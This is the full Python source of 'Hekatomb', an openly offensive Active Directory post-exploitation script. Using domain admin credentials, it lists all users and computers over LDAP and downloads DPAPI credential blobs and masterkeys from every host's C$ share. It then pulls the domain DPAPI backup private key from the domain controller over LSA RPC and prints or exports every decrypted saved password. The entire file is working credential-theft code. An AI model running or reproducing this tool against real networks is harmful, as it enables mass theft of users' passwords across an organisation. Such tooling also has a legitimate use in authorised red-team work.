#!/usr/bin/env python3
#
# HEKATOMB - Because Domain Admin rights are not enough. Hack them all.
#
# V 1.2.2
#
# Copyright (C) 2022 Les tutos de Processus. All rights reserved.
#
#
# Description:
#   Hekatomb is a python script that connects to LDAP directory to retrieve all computers and users informations.
#	Then it will download all DPAPI blob of all users from all computers.
#	Finally, it will extract domain controller private key through RPC uses it to decrypt all credentials.
#
# Author:
#   Processus (@ProcessusT)
# Collaborators:
#	C0wnuts (@kevin_racca)
#

import os, sys, argparse, random, string
from ldap3 import Connection, Server, NTLM, ALL
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection
from impacket.smb3structs import SMB2_DIALECT_002
from impacket.dcerpc.v5 import transport, lsad
from impacket import crypto
from impacket.uuid import bin_to_string
from impacket.dpapi import CredHist, PVK_FILE_HDR, PREFERRED_BACKUP_KEY, PRIVATE_KEY_BLOB, privatekeyblob_to_pkcs1, MasterKeyFile, MasterKey, DomainKey, DPAPI_DOMAIN_RSA_MASTER_KEY, CredentialFile, DPAPI_BLOB, CREDENTIAL_BLOB
import struct
import binascii
from binascii import hexlify
import dns.resolver
from impacket.examples.smbclient import MiniImpacketShell
import traceback
from Cryptodome.Cipher import PKCS1_v1_5
from datetime import datetime
from impacket.ese import getUnixTime
import hashlib

sys.tracebacklimit = 0




def main():
	print("\n██░ ██ ▓█████  ██ ▄█▀▄▄▄     ▄▄▄█████▓ ▒█████   ███▄ ▄███▓ ▄▄▄▄   \n▓██░ ██▒▓█   ▀  ██▄█▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ \n▒██▀▀██░▒███   ▓███▄░▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░▒██▒ ▄██\n░▓█ ░██ ▒▓█  ▄ ▓██ █▄░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██    ▒██ ▒██░█▀  \n░▓█▒░██▓░▒████▒▒██▒ █▄▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓\n ▒ ░░▒░▒░░ ▒░ ░▒ ▒▒ ▓▒▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒\n ▒ ░▒░ ░ ░ ░  ░░ ░▒ ▒░ ▒   ▒▒ ░   ░      ░ ▒ ▒░ ░  ░      ░▒░▒   ░ \n ░  ░░ ░   ░   ░ ░░ ░  ░   ▒    ░      ░ ░ ░ ▒  ░      ░    ░    ░ \n ░  ░  ░   ░  ░░  ░        ░  ░            ░ ░         ░    ░      \n   Because Domain Admin rights are not enough.\n\t\tHack them all.\n\n\t         @Processus\n**************************************************\n\n")

	parser = argparse.ArgumentParser(add_help = True, description = "Script used to automate domain computers and users extraction from LDAP and extraction of domain controller private key through RPC to collect and decrypt all users' DPAPI secrets saved in Windows credential manager.")

	parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address of DC>')

	auth = parser.add_argument_group('authentication')
	auth.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')

	options = parser.add_argument_group('authentication')
	options.add_argument('-pvk', action='store', help='\t\t\t\t\t\t\t\t\t\tDomain backup keys file')
	options.add_argument('-dns', action="store", help='DNS server IP address to resolve computers hostname')
	options.add_argument('-dnstcp', action="store_true", help='Use TCP for DNS connection')
	options.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="port", help='Port to connect to SMB Server')
	options.add_argument('-smb2', action="store_true", help='Force the use of SMBv2 protocol')
	options.add_argument('-just-user', action='store', help='Test only specified username')
	options.add_argument('-just-computer', action='store', help='Test only specified computer')
	options.add_argument('-md5', action="store_true", help='Print md5 hash instead of clear passwords')
	
	verbosity = parser.add_argument_group('verbosity')
	verbosity.add_argument('-csv', action="store_true", help='Export results to CSV file')
	verbosity.add_argument('-debug', action="store_true", help='Turn DEBUG output ON')
	verbosity.add_argument('-debugmax', action="store_true", help='Turn DEBUG output TO MAAAAXXXX')


	if len(sys.argv)==1:
		parser.print_help()
		sys.exit(1)


	options                             = parser.parse_args()
	domain, username, password, address = parse_target(options.target)
	passLdap 							= password
	if domain is None:
		domain = ''
	if password == '' and username != '' and options.hashes is None :
		from getpass import getpass
		password = getpass("Password:")
		passLdap = password
	if options.hashes is not None:
		lmhash, nthash = options.hashes.split(':')
		if '' == lmhash:
			lmhash = 'aad3b435b51404eeaad3b435b51404ee'
		passLdap       = f"{lmhash}:{nthash}"

	else:
		lmhash = ''
		nthash = ''

	if options.dns is None:
		dns_server = address
	else:
		dns_server = options.dns

	if options.smb2 is True:
		preferredDialect = SMB2_DIALECT_002
	else:
		preferredDialect = None

	myNameCharList = string.ascii_lowercase
	myNameLen      = random.randrange(6,12)
	myName         = ''.join((random.choice(myNameCharList) for i in range(myNameLen)))

	# test if account is domain admin by accessing to DC c$ share
	try:
		if options.debug is True or options.debugmax is True:
			print("Testing admin rights...")
		smbClient = SMBConnection(address, address, myName=myName, sess_port=int(options.port), preferredDialect=preferredDialect)
		smbClient.login(username, password, domain, lmhash, nthash)
		if smbClient.connectTree("c$") != 1:
			raise
		if options.debug is True or options.debugmax is True:
			print("Admin access granted.")
	except:
		print("Error : Account disabled or access denied. Are you really a domain admin ?")
		if options.debug is True or options.debugmax is True:
			import traceback
			traceback.print_exc()
		sys.exit(1)


	# try to connect to ldap

	if options.debug is True or options.debugmax is True:
		print("Testing LDAP connection...")

	connectionFailed = False
	serv 			 = Server(address, get_info=ALL, use_ssl=True, connect_timeout=15)
	ldapConnection   = Connection(serv, user=f"{domain}\\{username}", password=passLdap, authentication=NTLM)

	try:
		if not ldapConnection.bind():
			print("Error : Could not connect to ldap : bad credentials")
			sys.exit(1)
		if options.debug is True or options.debugmax is True:
			print("LDAP connection successfull with SSL encryption.")
	except:
		print("Error : Could not connect to ldap with SSL encryption. Trying without SSL encryption...")
		connectionFailed = True

	if True == connectionFailed:
		try:
			serv = Server(address, get_info=ALL, connect_timeout=15)
			ldapConnection = Connection(serv, user=f"{domain}\\{username}", password=passLdap, authentication=NTLM)
			if not ldapConnection.bind():
				print("Error : Could not connect to ldap : bad credentials")
				sys.exit(1)
			if options.debug is True or options.debugmax is True:
				print("LDAP connection successfull without encryption.")
		except:
			print("Error : Could not connect to ldap.")
			if options.debug is True or options.debugmax is True:
				import traceback
				traceback.print_exc()
			sys.exit(1)

	# Create the baseDN
	baseDN = serv.info.other['defaultNamingContext'][0]

	# catch all users in domain or just the specified one
	if options.just_user is not None :
		searchFilter = "(&(objectCategory=person)(objectClass=user)(sAMAccountName="+str( options.just_user)+"))"
		print("Target user will be only " + str( options.just_user))
	else:
		searchFilter = "(&(objectCategory=person)(objectClass=user))"
	try:
		if options.debug is True or options.debugmax is True:
			print("Retrieving user objects in LDAP directory...")
		users_list = []
		ldapConnection.search('%s' % (baseDN), searchFilter, attributes=['sAMAccountName', 'objectSID'])
		ldap_users = ldapConnection.entries
		if options.debug is True or options.debugmax is True:
			print("Converting ObjectSID in string SID...")
		
		for user in ldap_users:
			try:
				ldap_username = str(user['sAMAccountName'])
				sid           = str(user['objectSID'])
				name_and_sid  = [ldap_username.strip(), sid]
				users_list.append(name_and_sid)
			except:
				pass 
				# some users may not have samAccountName
		if options.debug is True or options.debugmax is True:
			print("Found about " + str( len(users_list) ) + " users in LDAP directory.")
	except:
		print("Error : Could not extract users from ldap.")
		if options.debug is True or options.debugmax is True:
			import traceback
			traceback.print_exc()
		sys.exit(1)
	if len(users_list) == 0:
		print("No user found in LDAP directory")
		sys.exit(1);


	# catch all computers in domain or just the specified one
	if options.just_computer is not None :
		computers_list = []
		computers_list.append( options.just_computer )
		print("Target computer will be only " + str( options.just_computer))
	else:
		try:
			if options.debug is True or options.debugmax is True:
				print("Retrieving computer objects in LDAP directory...")
			searchFilter   = "(&(objectCategory=computer)(objectClass=computer))"
			computers_list = []
			ldapConnection.search('%s' % (baseDN), searchFilter, attributes=['cn'])
			ldap_computers = ldapConnection.entries
			for computer in ldap_computers:
				try:
					comp_name = str(computer['cn'])
					computers_list.append(comp_name.strip())
				except:
					pass
			if options.debug is True or options.debugmax is True:
				print("Found about " + str( len(computers_list) ) + " computers in LDAP directory.")
		except:
			print("Error : Could not extract computers from ldap.")
			if options.debug is True or options.debugmax is True:
				import traceback
				traceback.print_exc()

	# creating folders to store blob and mkf
	if options.debug is True or options.debugmax is True:
		print("Creating structure folders to store blob and mkf...")
	if domain == '':
		directory = 'Results'
	else:
		directory = domain
	blobFolder = domain + "/blob"
	mkfFolder  = domain + "/mfk"
	if not os.path.exists(directory):
	    os.mkdir(directory)
	if not os.path.exists(blobFolder):
	    os.mkdir(blobFolder)
	if not os.path.exists(mkfFolder):
		os.mkdir(mkfFolder)



	if options.debug is True or options.debugmax is True:
		print("Connnecting to all computers to test user creds existence...")
	for current_computer in computers_list:
		# connect to all computers and extract all users blobs and mkf
		try:
			# resolve dns to ip address
			resolver             = dns.resolver.Resolver(configure=False)
			resolver.nameservers = [dns_server]
			current_computer     = current_computer + "." + domain
			if options.dnstcp is True:
				answer = resolver.resolve(current_computer, "A", tcp=True)
			else:
				answer = resolver.resolve(current_computer, "A")
			if len(answer) == 0:
				sys.exit(1)
			else:
				answer = str(answer[0])
			smbClient  = SMBConnection(answer, answer, myName=myName, sess_port=int(options.port), timeout=10, preferredDialect=preferredDialect)
			smbClient.login(username, password, domain, lmhash, nthash)
			tid = smbClient.connectTree('c$')
			if tid != 1:
				sys.exit(1)

			for current_user in users_list:
				try:
					if options.debugmax is True:
						print("Trying user " + str(current_user[0]) + " on computer " + str(current_computer) )
					response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\*")
					is_there_any_blob_for_this_user = False
					count_blobs = 0
					count_mkf   = 0
					for blob_file in response:
						blob_file = str( str(blob_file).split("longname=\"")[1] ).split("\", filesize=")[0]
						if blob_file != "." and blob_file != "..":
							# create and retrieve the credential blob
							count_blobs     = count_blobs + 1
							computer_folder = blobFolder + "/" + str(current_computer)
							if not os.path.exists(computer_folder):
								os.mkdir(computer_folder)
							user_folder = computer_folder + "/" + str(current_user[0])
							if not os.path.exists(user_folder):
								os.mkdir(user_folder)
							wf = open(user_folder + "/" + blob_file,'wb')
							smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\" + blob_file, wf.write)
							is_there_any_blob_for_this_user = True
					response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Local\\Microsoft\\Credentials\\*")

					for blob_file in response:
						blob_file = str( str(blob_file).split("longname=\"")[1] ).split("\", filesize=")[0]
						if blob_file != "." and blob_file != "..":
							# create and retrieve the credential blob
							count_blobs     = count_blobs + 1
							computer_folder = blobFolder + "/" + str(current_computer)
							if not os.path.exists(computer_folder):
								os.mkdir(computer_folder)
							user_folder = computer_folder + "/" + str(current_user[0])
							if not os.path.exists(user_folder):
								os.mkdir(user_folder)
							wf = open(user_folder + "/" + blob_file,'wb')
							smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Local\\Microsoft\\Credentials\\" + blob_file, wf.write)
							is_there_any_blob_for_this_user = True
					if is_there_any_blob_for_this_user is True:
						# If there is cred blob there is mkf so we have to get them too
						response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Protect\\" + current_user[1] + "\\*")
						for mkf in response:
							mkf = str( str(mkf).split("longname=\"")[1] ).split("\", filesize=")[0]
							if mkf != "." and mkf != ".." and mkf != "Preferred" and mkf[0:3] != "BK-":
								count_mkf = count_mkf + 1
								wf        = open(mkfFolder + "/" + mkf,'wb')
								smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Protect\\" + current_user[1] + "\\" + mkf, wf.write)
						print("\nNew credentials found for user " + str(current_user[0]) + " on " + str(current_computer) + " :")
						print("Retrieved " + str(count_blobs) + " credential blob(s) and " + str(count_mkf) + " masterkey file(s)")	
				except KeyboardInterrupt:
					os._exit(1)
				except:
					pass # this user folder do not exist on this computer
		except KeyboardInterrupt:
			os._exit(1)
		except dns.exception.DNSException:
			if options.debugmax is True:
				print("Error on computer "+str(current_computer))
				import traceback
				traceback.print_exc()
			pass
		except:
			if options.debugmax is True:
				print("Debug : Could not connect to computer : " + str(current_computer))
			if options.debugmax is True:
				import traceback
				traceback.print_exc()
			pass # this computer is probably turned off for the moment
	


	if options.pvk is None:
		if options.debug is True:
			print("Domain backup keys not given.\nTrying to extract...")
		# get domain backup keys
		try:
			array_of_mkf_keys = []
			connection        = SMBConnection(address, address, myName=myName, preferredDialect=preferredDialect)
			connection.login(username, password, domain, lmhash, nthash)
			# create rpc pipe
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:445[\pipe\lsarpc]')
			rpctransport.set_smb_connection(connection)
			dce = rpctransport.get_dce_rpc()
			dce.connect()
			# connection to LSA remotely through RPC
			dce.bind(lsad.MSRPC_UUID_LSAD)
			resp = lsad.hLsarOpenPolicy2(dce, lsad.POLICY_GET_PRIVATE_INFORMATION)

			# now retrieve backup key GUID : https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp/e8118398-d3da-45fc-827f-186f1c417b69
			buffer     = crypto.decryptSecret(connection.getSessionKey(), lsad.hLsarRetrievePrivateData(dce, resp['PolicyHandle'], "G$BCKUPKEY_PREFERRED"))
			guid       = bin_to_string(buffer)
			name       = "G$BCKUPKEY_{}".format(guid)
			secret     = crypto.decryptSecret(connection.getSessionKey(), lsad.hLsarRetrievePrivateData(dce, resp['PolicyHandle'], name))
			backup_key = PREFERRED_BACKUP_KEY(secret)
			pvk 	   = backup_key['Data'][:backup_key['KeyLength']]

			# see my PR on pypykatz to understand structure : https://github.com/skelsec/pypykatz/blob/master/pypykatz/dpapi/dpapi.py
			header                  = PVK_FILE_HDR()
			header['dwMagic']       = 0xb0b5f11e
			header['dwVersion']     = 0
			header['dwKeySpec']     = 1
			header['dwEncryptType'] = 0
			header['cbEncryptData'] = 0
			header['cbPvk']         = backup_key['KeyLength']
			key                     = header.getData() + pvk
			open(directory + "/pvkfile.pvk", 'wb').write(key)
		except:
			print("Error : Can't extract domain backup keys.")
			if options.debug is True or options.debugmax is True:
				import traceback
				traceback.print_exc()
			sys.exit(1)



	if options.pvk is not None or os.path.exists(directory+"/pvkfile.pvk"):
		pvk_file = directory + "/pvkfile.pvk"
		if options.pvk is not None:
			pvk_file = options.pvk

		# decrypt pvk file
		if options.debug is True:
			print("Domain backup keys found.")
			print("Trying to decrypt PVK file...")
		try:
			pvkfile = open(pvk_file, 'rb').read()
			key = PRIVATE_KEY_BLOB(pvkfile[len(PVK_FILE_HDR()):])
			private = privatekeyblob_to_pkcs1(key)
			cipher = PKCS1_v1_5.new(private)

			array_of_mkf_keys = []
			if options.debug is True:
				print("PVK file decrypted.\nTrying to decrypt all MFK...")

			for filename in os.listdir(mkfFolder):
				try:
					# open mkf and extract content
					fp = open(mkfFolder + "/" + filename, 'rb')
					data = fp.read()
					mkf= MasterKeyFile(data)
					data = data[len(mkf):]
					if mkf['MasterKeyLen'] > 0:
						mk = MasterKey(data[:mkf['MasterKeyLen']])
						data = data[len(mk):]
					if mkf['BackupKeyLen'] > 0:
						bkmk = MasterKey(data[:mkf['BackupKeyLen']])
						data = data[len(bkmk):]
					if mkf['CredHistLen'] > 0:
						ch = CredHist(data[:mkf['CredHistLen']])
						data = data[len(ch):]
					if mkf['DomainKeyLen'] > 0:
						dk = DomainKey(data[:mkf['DomainKeyLen']])
						data = data[len(dk):]
					# try to decrypt mkf with domain backup key
					decryptedKey = cipher.decrypt(dk['SecretData'][::-1], None)
					if decryptedKey:
						domain_master_key = DPAPI_DOMAIN_RSA_MASTER_KEY(decryptedKey)
						key = domain_master_key['buffer'][:domain_master_key['cbMasterKey']]
						array_of_mkf_keys.append(key)
						if options.debugmax is True:
							print("New mkf key decrypted : " + str(hexlify(key).decode('latin-1')) )
				except:
					if options.debugmax is True:
						print("Error occured while decrypting MKF.")
						import traceback
						traceback.print_exc()
					pass
			if options.debug is True:
				print(str( len(array_of_mkf_keys)) + " MKF keys have been decrypted !")
		except:
			print("Error occured while decrypting PVK file.")
			if options.debug is True:
				import traceback
				traceback.print_exc()
			os._exit(1)
	else:
		print("Domain backup keys not found.")
		if options.debug is True:
			import traceback
			traceback.print_exc()
		os._exit(1)	



	if len(array_of_mkf_keys) > 0:
		# We have MKF keys so we can start blob decryption
		if options.debug is True:
			print("Starting blob decryption with MKF keys...")
		array_of_credentials = []
		for current_computer in os.listdir(blobFolder):
			current_computer_folder = blobFolder + "/" + current_computer
			if current_computer != "." and current_computer != ".." and os.path.isdir(current_computer_folder):
				for username in os.listdir(current_computer_folder):
					current_user_folder = current_computer_folder + "/" + username
					if username != "." and username != ".." and os.path.isdir(current_user_folder):
						for filename in os.listdir(current_user_folder):
							try:
								fp   = open(current_user_folder + "/" + filename, 'rb')
								data = fp.read()
								cred = CredentialFile(data)
								blob = DPAPI_BLOB(cred['Data'])

								if options.debugmax is True:
									print("Starting decryption of blob " + filename + "...")

								for mkf_key in array_of_mkf_keys:
									try:
										decrypted = blob.decrypt(mkf_key)
										if decrypted is not None:
											creds = CREDENTIAL_BLOB(decrypted)
											tmp_cred = {}
											tmp_cred['foundon'] = str(current_computer)
											tmp_cred['inusersession'] = str(username)
											tmp_cred['lastwritten'] = datetime.utcfromtimestamp(getUnixTime(creds['LastWritten']))
											tmp_cred['target'] = creds['Target'].decode('utf-16le')
											tmp_cred["username"] = creds['Username'].decode('utf-16le')
											tmp_cred["password1"] = creds['Unknown'].decode('utf-16le') 
											tmp_cred["password2"] = str( creds['Unknown3'].decode('utf-16le') ) 
											if options.md5 is True:
												if len(creds['Unknown'].decode('utf-16le')) > 0:
													tmp_cred["password1"] = hashlib.md5(str( creds['Unknown'].decode('utf-16le')  ).encode('utf-8')).hexdigest()
												tmp_cred["password2"] = hashlib.md5(str( creds['Unknown3'].decode('utf-16le')  ).encode('utf-8')).hexdigest()
											array_of_credentials.append(tmp_cred)
									except:
										if options.debugmax is True:
											print("Error occured while decrypting blob file.")
											import traceback
											traceback.print_exc()
										pass
							except:
								if options.debug is True:
									print("Error occured while decrypting blob file.")
									import traceback
									traceback.print_exc()
								pass
		if len(array_of_credentials) > 0:
			if options.debug is True:
				print(str(len(array_of_credentials)) + " credentials have been decrypted !\n")
			i = 0
			if options.csv is True:
				with open(directory + '/exported_credentials.csv', 'w', encoding='UTF8') as f:
					header = "Found on;Session username;LastWritten;Target;Username;Password 1;Password 2\n"
					f.write(header)
					for credential in array_of_credentials:
						i = i + 1
						current_row = str(credential['foundon']) +";"+ str(credential['inusersession'])+";"+  str(credential['lastwritten'])+";"+ str(credential['target'])+";"+ str(credential['username'])+";"+  str(credential['password1'])+";"+ str(credential['password2'])+"\n"
						f.write(current_row)
				print("File successfully saved to ./" + str(directory) + '/exported_credentials.csv')
			else:	
				for credential in array_of_credentials:
					if i == 0:
						print("***********************************************")
						i = i + 1
					print("Found on : " + str(credential['foundon']))
					print("Session username : " + str(credential['inusersession']))
					print("LastWritten : " + str(credential['lastwritten']))
					print("Target : " + str(credential['target']))
					print("Username : " + str(credential['username']))
					if len(credential['password1']) > 0:
						print("Password 1 : " + str(credential['password1']))
						print("Password 2 : " + str(credential['password2']))
					else:
						print("Password : " + str(credential['password2']))
					print("***********************************************")
				
				
		else:
			print("No credentials could be decrypted.")
			os._exit(1)
	else:
		print("No MKF have been decrypted.\nBlobs will not be decrypted.")
		os._exit(1)



if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		os._exit(1)